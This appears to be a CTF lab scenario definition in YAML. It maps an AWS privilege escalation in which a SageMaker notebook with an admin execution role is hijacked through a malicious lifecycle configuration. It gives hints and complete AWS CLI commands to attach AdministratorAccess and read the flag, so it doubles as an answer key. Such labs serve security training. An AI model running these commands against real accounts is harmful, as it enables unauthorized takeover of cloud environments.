attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-sagemaker-005-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has SageMaker notebook management permissions including
        sagemaker:StopNotebookInstance, sagemaker:CreateNotebookInstanceLifecycleConfig,
        sagemaker:UpdateNotebookInstance, and sagemaker:StartNotebookInstance on the
        target notebook instance.

    - id: notebook-instance
      label: "Notebook Instance"
      type: resource
      subType: sagemaker-notebook
      arn: "arn:aws:sagemaker:{region}:{account_id}:notebook-instance/pl-prod-sagemaker-005-to-admin-notebook"
      description: >
        This SageMaker notebook instance is running with an IAM execution role that has
        AdministratorAccess. Lifecycle configuration scripts run automatically on notebook
        startup and execute with this privileged execution role's credentials — not the
        credentials of the user who modified the configuration.

    - id: target-role
      label: "Admin Notebook Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-sagemaker-005-to-admin-notebook-role"
      description: >
        This IAM role has AdministratorAccess and is used as the SageMaker notebook's
        execution role. By injecting a malicious lifecycle configuration script, the
        attacker causes this role to execute arbitrary code on notebook startup —
        including granting the attacker's user account administrative privileges.
        The starting user ends up with admin-equivalent permissions, which are then
        used to read the scenario's CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/sagemaker-005-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-principal
      to: notebook-instance
      label: "sagemaker:StopNotebookInstance + sagemaker:CreateNotebookInstanceLifecycleConfig + sagemaker:UpdateNotebookInstance"
      description: >
        Stop the notebook instance, create a malicious lifecycle configuration containing
        a script that grants AdministratorAccess to the starting user, then update the
        notebook to attach the malicious lifecycle config. The notebook must be stopped
        before its lifecycle configuration can be changed.
      hints:
        - "Start by listing and describing the SageMaker notebook instances in this account -- look at the execution role ARN attached to the notebook."
        - "Use iam:GetRole or iam:ListAttachedRolePolicies to check what permissions the notebook's execution role carries."
        - "SageMaker lifecycle configurations are scripts that run automatically when a notebook starts up -- and they run as the notebook's execution role, not as you."
        - "To change a notebook's lifecycle configuration, the notebook must first be in the Stopped state. Use sagemaker:StopNotebookInstance and poll until the status is Stopped."
        - "Create a lifecycle configuration with an on-start script that performs a privileged action using the notebook role's permissions. The script content must be base64-encoded."
        - "After creating your lifecycle config, attach it to the notebook using sagemaker:UpdateNotebookInstance with the --lifecycle-config-name parameter."
        - "Browse to https://pathfinding.cloud/paths/sagemaker-005 for technique details."
      commands:
        - description: "Stop the notebook instance"
          command: "aws sagemaker stop-notebook-instance --notebook-instance-name pl-prod-sagemaker-005-to-admin-notebook --region us-east-1"
        - description: "Create a malicious lifecycle configuration that grants admin access to the starting user"
          command: "aws sagemaker create-notebook-instance-lifecycle-config --notebook-instance-lifecycle-config-name pl-malicious-lifecycle-config --region us-east-1 --on-start Content=$(echo '#!/bin/bash\\naws iam attach-user-policy --user-name pl-prod-sagemaker-005-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess' | base64)"
        - description: "Update the notebook to use the malicious lifecycle configuration"
          command: "aws sagemaker update-notebook-instance --notebook-instance-name pl-prod-sagemaker-005-to-admin-notebook --lifecycle-config-name pl-malicious-lifecycle-config --region us-east-1"

    - from: notebook-instance
      to: target-role
      label: "sagemaker:StartNotebookInstance"
      description: >
        Start the notebook instance, triggering automatic execution of the malicious
        lifecycle configuration script. The script runs with the notebook's execution
        role credentials (AdministratorAccess), attaching the AdministratorAccess managed
        policy to the starting user and completing the privilege escalation.
      hints:
        - "Once the notebook's lifecycle config is attached and the notebook is stopped, start it with sagemaker:StartNotebookInstance to trigger the on-start script."
        - "The lifecycle script can take 5-8 minutes to execute -- the notebook status will move from Pending to InService once startup completes."
        - "After the notebook reaches InService, wait a few seconds for IAM policy changes to propagate before verifying the escalation worked."
      commands:
        - description: "Start the notebook instance, triggering the malicious lifecycle script"
          command: "aws sagemaker start-notebook-instance --notebook-instance-name pl-prod-sagemaker-005-to-admin-notebook --region us-east-1"
        - description: "Verify administrator access was granted"
          command: "aws iam list-attached-user-policies --user-name pl-prod-sagemaker-005-to-admin-starting-user --query 'AttachedPolicies[*].PolicyArn' --output text"

    - from: target-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "You now hold admin-equivalent credentials. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets."
        - "Scenario flags live under a shared prefix in SSM Parameter Store — consider what a reasonable naming convention for this lab might look like."
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/sagemaker-005-to-admin --query 'Parameter.Value' --output text"
